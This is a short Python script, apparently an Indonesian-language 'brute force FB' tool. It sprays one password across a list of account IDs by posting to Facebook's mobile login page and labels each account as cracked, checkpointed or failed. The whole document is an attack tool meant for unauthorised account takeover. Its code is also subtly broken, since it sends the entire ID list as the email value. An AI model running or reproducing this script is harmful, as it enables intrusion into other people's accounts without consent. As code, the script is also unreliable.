#!/bin/python
from requests import post
import asyncio, os, signal
import colored
color = colored.fg(2)
color2 = colored.fg(1)
color3 = colored.fg(4)
color4 = colored.fg(5)
def keyboardInterruptHandler(signal, frame):
    print("KeyboardInterrupt (ID: %s)" % (signal,))
    exit(0)
signal.signal(signal.SIGINT, keyboardInterruptHandler)
async def kamuuu(gans, pw):
    ru = {'email':gans,'pass':pw,'login':'submit'}
    agent = {'User-agent': 'Mozilla/5.0'}
    rz = post("https://free.facebook.com/login", ru, agent)
    if 'm_ses' in rz.url or 'save-device' in rz.url:
        print (f"%s[+] BERHASIL CRACK -> {wordlist}|{pw}" % (color,))
    elif 'checkpoint' in rz.url:
         print (f'[-] CHECKPOINT -> {wordlist}')
    else:
         print (f'{color4}[+] GAGAL -> {wordlist}')
if __name__ == '__main__':
  os.system("clear")
  print (f""" {color3}
         [ CREATE BY WIDHISEC ]
         [ BRUTE FORCE FB     ]
               """)
  gan = input(str("list id : "))
  pw = input("crack pw :")
  with open(gan) as f:
    gans = f.read().splitlines()
  for wordlist in gans:
      loop = asyncio.get_event_loop()
      loop.run_until_complete(kamuuu(gans,pw))
